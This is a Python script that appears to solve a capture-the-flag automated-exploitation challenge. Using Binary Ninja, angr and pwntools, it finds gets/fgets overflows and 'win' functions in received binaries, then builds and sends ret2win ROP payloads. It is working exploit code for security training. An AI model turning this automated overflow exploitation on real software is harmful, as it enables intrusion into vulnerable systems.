from binaryninja import *
from pwn import *
import networkx as nx
import claripy
import base64
import angr

context.log_level = "DEBUG"
BIN_PATH = "code.bin"


def find_vuln(bv):
    win_functions = {"fgets", "gets"}

    for win_func in win_functions:
        func = bv.get_functions_by_name(win_func)
        if not func:
            continue

        return func[0].callers[0].start
    return None


def find_win(bv):
    win_function = ()
    keywords = {"system", "execve"}
    known_flag_names = {"flag", "pass", "passwd", "secret", "winkey"}

    # Check for function that gives us system("cat pass") or system("cat flag") etc
    for func in bv.functions:
        if any(keyword in func.name for keyword in keywords):
            for ref in func.callers:
                win_function = (ref.name, ref)
                return win_function

    # Check for function that reads flag and then prints it to STDOUT
    for string in bv.strings:
        if any(keyword in string.value for keyword in known_flag_names):
            # Get XREFs
            for ref in bv.get_code_refs(string.start):
                win_function = (ref.function.name, ref.function)
                return win_function

    return win_function


def _extract_function_graph(bv):
    G = nx.DiGraph()
    for func in bv.functions:
        G.add_node(func.start)
        for caller in func.callers:
            G.add_edge(caller.start, func.start)
        for callee in func.callees:
            G.add_edge(func.start, callee.start)
    return G


def find_path(bv, vuln_func_addr, win_func_addr):
    G = _extract_function_graph(bv)
    main_func = bv.get_functions_by_name("main")[0]
    start_addr = main_func.start

    try:
        path = nx.shortest_path(G, source=start_addr, target=vuln_func_addr)
    except nx.NetworkXNoPath as e:
        print(f"No path between main and vuln function...")
        try:
            path = nx.shortest_path(G, source=start_addr, target=win_func_addr)
        except nx.NetworkXNoPath as e:
            print(f"No path between main and win function... sucks hard")
            return None

    proj = angr.Project("code.bin", auto_load_libs=False)
    state = proj.factory.entry_state()

    stdin = claripy.BVS("stdin", 0x80 * 8)
    initial_state = proj.factory.entry_state(
        stdin=stdin,
        add_options={
            angr.sim_options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
            angr.sim_options.ZERO_FILL_UNCONSTRAINED_MEMORY,
        },
    )
    simgr = proj.factory.simulation_manager(initial_state)

    base = proj.loader.main_object.mapped_base
    log.info(f"{hex(base)}, {proj.loader}, {hex(start_addr)}")
    for target_addr in path:
        # print(f"{target_addr}, {type(target_addr)}")
        simgr.explore(find=target_addr)
        if "found" not in simgr.stashes or len(simgr.found) == 0:
            print(f"Could not find path to {hex(target_addr)}")
            return None
        log.info(f"Found path to {hex(target_addr)}")
        state = simgr.found[0]
        simgr = proj.factory.simulation_manager(state)

    solution = state.posix.dumps(0)
    solution = solution.split(b"\x00")
    # remove empty b''
    seen = set()
    seen_add = seen.add
    solution = [x for x in solution if not (x in seen or seen_add(x))]
    solution.remove(b"")  # remove empty b''
    solution = [
        x for x in solution if x.isalpha()
    ]  # keep only alpha chars, idk why i was getting b"\x01" sometimes
    return solution


def find_overflow_size(bv):
    win_functions = {"fgets", "gets"}
    vuln_func = None

    for func in bv.functions:
        for win_func in win_functions:
            func = bv.get_functions_by_name(win_func)
            if not func:
                continue

            vuln_func = func[0]
            vuln_func = list(vuln_func.caller_sites)[0]
            break

    vuln_func_hlil = vuln_func.hlil
    name = bv.get_function_at(vuln_func_hlil.dest.constant).name
    if name == "fgets":
        return abs(vuln_func_hlil.params[0].value.value)
    elif name == "__isoc99_scanf":
        return abs(vuln_func_hlil.params[1].value.value)
    elif name == "gets":
        return abs(vuln_func_hlil.params[0].value.value)
    else:
        print(f"{name=}")
        return "ERROR"


def get_binary(io):
    io.recvuntil(b"----------------")
    b64_binary = io.recvuntil(b"----------------", drop=True)
    with open("code.bin", "wb") as f:
        f.write(base64.b64decode(b64_binary))


def main():
    io = process(["python3", "challenge/main.py"])
    # io = remote("lazy-gambler-pwner.chal.idek.team", 1337)
    for i in range(50):
        get_binary(io)
        bv = binaryninja.load(BIN_PATH)
        vuln_func_addr = find_vuln(bv)
        log.info(f"Found vuln func at {hex(vuln_func_addr)}")
        win_func_addr = find_win(bv)
        log.info(f"Found win func {win_func_addr[0]} at {hex(win_func_addr[1].start)}")
        path = find_path(bv, vuln_func_addr, win_func_addr[1].start)
        log.info(f"Found path from main to vuln {path}")
        size = find_overflow_size(bv)
        log.info(f"Overflow size of {size}")

        rop = ROP(BIN_PATH)

        ret = rop.find_gadget(["ret"])[0]
        if len(path) == 0:
            path = b""
        elif len(path) == 1:
            path = path[0] + b"\n"
        else:
            path = b"\n".join(path) + b"\n"
        payload = (
            path
            + b"A" * size
            + p64(ret)
            + p64(
                win_func_addr[1].start
            )  # to avoid crashing because of alignment issue >>
            + p64(
                bv.get_functions_by_name("main")[0].start + 4
            )  # our program must terminate *somewhat* properly!
        )

        b64_payload = base64.b64encode(payload)
        io.sendlineafter(b"solution:\n", b64_payload)
        log.success(f"Challenge {i+1} solved!")

    io.interactive()


main()
